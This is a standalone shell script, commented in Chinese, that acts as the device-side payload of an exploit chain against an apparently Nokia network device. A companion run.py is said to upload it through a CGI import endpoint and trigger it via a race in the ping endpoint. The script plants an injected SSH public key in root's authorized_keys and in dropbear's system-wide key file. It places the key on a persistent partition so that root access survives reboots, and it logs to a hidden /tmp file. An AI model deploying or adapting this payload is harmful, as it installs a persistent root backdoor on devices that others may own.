#!/bin/sh
# 设备侧 payload —— 把 SSH 公钥装进 root，拿真 root shell (uid=0 gid=0)
# 由 run.py 注入 __PUBKEY__ / __TAG__ 后经 usb_web_app.cgi?import 上传，再用 ?ping 抢窗口执行。
#
# 必须显式设 PATH：?ping 派生出的 /bin/sh 用的是最小 PATH，/usr/sbin 不在里面。
# 不需要 sleep 保活 —— 只是写文件，脚本退出后文件还在。
PATH=/usr/sbin:/usr/bin:/sbin:/bin:/webs
export PATH
exec >/tmp/.nokiask.log 2>&1

echo "=== nokia sshkey payload ==="
id

# 两个落点都写：
#   /root/.ssh/authorized_keys      —— dropbear 的用户级默认位置
#   /etc/dropbear/authorized_keys   —— dropbear 的系统级文件；本机 /etc/dropbear 是
#                                      开机软链 -> /configs/overlay/etc/dropbear（持久分区），
#                                      恢复出厂前真正扛住重启的就是这一份。
# 恢复出厂后只写 ~/.ssh 会认证失败，所以两个都放，哪条路被认就通哪条。
# /etc/dropbear 若是指向持久分区的软链，软链悬空时 mkdir 软链本身会失败，
# 得先顺着 readlink 把真正的目标目录建出来。
if [ -L /etc/dropbear ]; then
    _t=$(readlink /etc/dropbear)
    case "$_t" in /*) mkdir -p "$_t" 2>/dev/null ;; esac
fi

for d in /root/.ssh /etc/dropbear; do
    mkdir -p "$d"
    chmod 700 "$d"
    chown root:root "$d"            # 关键：probe92 失败就是因为它当时是 root:appServi
    touch "$d/authorized_keys"
    grep -q '__TAG__' "$d/authorized_keys" 2>/dev/null \
      || echo '__PUBKEY__' >> "$d/authorized_keys"
    chmod 600 "$d/authorized_keys"
    chown root:root "$d/authorized_keys"
done

ls -ld /root /root/.ssh /etc/dropbear
ls -l /root/.ssh/authorized_keys /etc/dropbear/authorized_keys
echo "=== done ==="
